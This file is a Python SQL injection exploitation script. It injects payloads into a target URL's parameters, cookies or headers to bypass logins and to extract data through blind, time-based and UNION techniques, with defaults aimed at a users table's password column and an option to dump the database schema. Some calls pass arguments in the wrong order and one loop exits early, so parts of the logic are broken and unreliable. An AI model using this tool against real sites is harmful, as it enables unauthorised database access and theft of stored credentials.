import argparse
import base64
import requests
import string
import sys
import time

CONF = { 'get_data': '', 'post_data': '', 'cookies': {}, 'headers': {},
        'sep_col': '', 'sep_line': '', 'table': '', 'column': '', 'delay_request': 0, 'success': None, 'error': None }

CONF['headers']['User-Agent'] = "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0"


def build_payload(payload):

    get_data = CONF['get_data'].replace('^SQLI^', payload)
    post_data = CONF['post_data'].replace('^SQLI^', payload)
    
    cookies = {}
    for k, v in CONF['cookies'].items():
        cookies[k] = v.replace('^SQLI^', payload)

    headers = {}
    for k, v in CONF['headers'].items():
        headers[k] = v.replace('^SQLI^', payload)

    return get_data, post_data, cookies, headers


def check_url(url, payload):

    time.sleep(CONF['delay_request'])

    get_data, post_data, cookies, headers = build_payload(payload)

    #print(get_data, post_data, cookies, headers)


    if CONF['method'] == 'POST':
        headers['Content-Type'] = "application/x-www-form-urlencoded"
        headers['Content-Length'] = str(len(post_data))

        res = requests.post(url + '?' + get_data, data=post_data, cookies=cookies, headers=headers)
    else:
        res = requests.get(url + '?' + get_data, cookies=cookies, headers=headers)

    return res


def check_result(result):
    check = True

    if CONF['success'] is not None and CONF['success'] not in result.text:
        check = False

    if CONF['error'] is not None and CONF['error'] in result.text:
        check = False

    return check


def blind_extract(url, val, data_length=20, charset=string.printable):
    data_found = ''

    for idx in range(1, data_length + 1):

        for char in charset:

            result = check_url(url, f"{val}{CONF['breaker']} AND SUBSTRING({CONF['column']}, {idx}, 1) = '{char}'")
            check = check_result(result)

            if check:
                data_found += char
                break

    return data_found


def blind_data_length(url, val):
    data_length = 0

    while True:
        result = check_url(url, f"{val}{CONF['breaker']} AND length({CONF['column']}) >= {data_length + 1}-- -")
        check = check_result(result)

        if check:
            data_length += 1
        else:
            break

    return data_length


def union_nb_columns(url, val):
    nb_columns = 0

    while True:
        result = check_url(url, f"{val}{CONF['breaker']} ORDER BY {nb_columns+1}-- -")
        check = check_result(result)

        if check:
            nb_columns += 1
        else:
            break

    return nb_columns


def union_readable_column(url, nb_columns, val):

    tab_fields = [str(x) * 10 for x in range(nb_columns)]
    fields = ','.join(tab_fields)

    result = check_url(url, f"{val}{CONF['breaker']} UNION SELECT {fields} FROM {CONF['table']} LIMIT 0,1-- -")
    check = check_result(result)
    
    if check:
        for x in range(len(tab_fields)):
            if tab_fields[x] in result.text:
                return x

    return -1

def union_extract(url, nb_columns, val, idx_column=0, limit_start=0, limit_count=500):
    data_found = ''

    column = CONF['column'].split(',')
    sep_line = CONF['sep_line'].encode().hex()
    sep_col = CONF['sep_col'].encode().hex()

    column = f"CONCAT(0x{sep_line},{(',0x'+sep_col+',').join(column)},0x{sep_line})"
    fields = ('1,' * idx_column) + column + (',1' * (nb_columns-1-idx_column))

    result = check_url(url, f"{val}{CONF['breaker']} UNION SELECT {fields} FROM {CONF['table']} LIMIT {limit_start}, {limit_count}-- -")
    check = check_result(result)

    tab_final = []

    if check or CONF['sep_col'] in result.text:
        tab_lines = result.text.split(CONF['sep_line'])
        tab_lines = tab_lines[1:-1:2]

        for line in tab_lines:
            tab_cols = line.split(CONF['sep_col'])
            tab_final.append(tab_cols)

    return tab_final


def time_extract(url, val, data_length=20, charset=string.printable):
    data_found = ''

    for idx in range(1, data_length + 1):
        for char in charset:

            start_time = time.time()

            result = check_url(url, f"{val}{CONF['breaker']} AND IF (SUBSTRING({CONF['column']}, {idx}, 1) = '{char}', sleep({CONF['time_delay']}), 'false')-- -")
            #check = check_result(result)

            if (time.time() - start_time) >= CONF['time_delay']:
                data_found += char
                return data_length

    return data_found



def time_data_length(url, val):
    data_length = 0

    while True:

        start_time = time.time()

        result = check_url(url, f"{val}{CONF['breaker']} AND IF (length({CONF['column']}) = {data_length}, sleep({CONF['time_delay']}), 'false')-- -")
        #check = check_result(result)

        if (time.time() - start_time) >= CONF['time_delay']:
            return data_length


    #payload = "1' AND (SELECT 8889 FROM (SELECT(SLEEP(5)))HhUy) AND 'lDLY'='lDLY"



print()
parser = argparse.ArgumentParser(description='HTTP POST bruteforcer')
parser.add_argument('-u', '--url', required=True, help='URL to bruteforce')
parser.add_argument('-x', '--headers', action='append', help='Additionnal headers, format HEADER:VALUE Use ^SQLI^ as placeholder')
parser.add_argument('-c', '--cookies', action='append', help='Cookies. Standard format : NAME:VALUE Use ^SQLI^ as placeholder')
parser.add_argument('-p', '--post-data', default='', help='POST body to send. Standard format : var1=val1&var2=val2 Use ^SQLI^ as placeholder')
parser.add_argument('-g', '--get-data', default='', help='GET data to send. Standard format : var1=val1&var2=val2 Use ^SQLI^ as placeholder')
parser.add_argument('-f', '--field', default='password', help='Field to extract')
parser.add_argument('-t', '--table', default='users', help='Table to extract from')
parser.add_argument('-m', '--method', default='POST', help='HTTP method to use')
parser.add_argument('-a', '--action', default='', help='What do I do ? blind, union, login, time')
parser.add_argument('-d', '--dump-schema', default=False, action='store_true', help='dump database schema')
parser.add_argument('-v', '--value', default='', help='valid value')

#group = parser.add_mutually_exclusive_group(required=True)
parser.add_argument('-s', '--success', metavar='MSG SUCCESS', help='Success string to look for')
parser.add_argument('-e', '--error', metavar='MSG ERROR', help='Error string to look for')
#args = parser.parse_args()
args, leftovers = parser.parse_known_args()




CONF['breaker'] = "" #"'"
CONF['bad_value'] = '-1'
CONF['sep_col'] = '|||'
CONF['sep_line'] = '%%%'
CONF['delay_request'] = 0.05
CONF['time_delay'] = 2

CONF['column'] = args.field
CONF['table'] = args.table
CONF['value'] = args.value
CONF['success'] = args.success
CONF['error'] = args.error

CONF['method'] = args.method.upper()
CONF['get_data'] = args.get_data
CONF['post_data'] = args.post_data

list_bypass = ["admin"+ CONF['breaker'] +"-- -", "admin"+ CONF['breaker'] +" and 1=1-- -", "admin"+ CONF['breaker'] +" or 1=1 limit 1"]

if args.cookies:
    for c in args.cookies:
        idx = c.find('=')
        if idx > -1:
            CONF['cookies'][c[0:idx].strip()] = c[idx+1:].strip()

if args.headers:
    for h in args.headers:
        idx = h.find('=')
        if idx > -1:
            CONF['headers'][h[0:idx].strip()] = h[idx+1:].strip()


if args.dump_schema:
    CONF['column'] = "table_name,column_name"
    CONF['table'] = "information_schema.columns where table_schema=database()"

url = args.url
print("[+] URL :", url)


if args.action == 'login':

    for bypass in list_bypass:
        result = check_url(url, bypass, '')
        check = check_result(result)

        if check:
            print("Bypass works with payload", bypass)

elif args.action == 'blind':
    data_length = blind_data_length(url, CONF['value'])
    print("Found length :", data_length)
    data_found = blind_extract(url,data_length, CONF['value'])
    print("Found data :", data_found)

elif args.action == 'union':
    nb_columns = union_nb_columns(url, CONF['value'])
    print("Found nb columns :", nb_columns)
    idx_column = union_readable_column(url, nb_columns, CONF['bad_value'])
    print("Found readable column :", idx_column+1)
    data_found = union_extract(url, nb_columns, CONF['bad_value'], idx_column)
    print("Found data :", data_found)

    if len(data_found) == 1:
        x = 1
        while len(data_found) > 0:
            data_found = union_extract(url, nb_columns, CONF['bad_value'], idx_column, limit_start=x, limit_count=1)
            x += 1
            print(data_found)


elif args.action == 'time':
    data_length = time_data_length(url, CONF['value'])
    print("Found length :", data_length)
    data_found = time_extract(url,data_length, CONF['value'])
    print("Found data :", data_found)


print("That's all then")
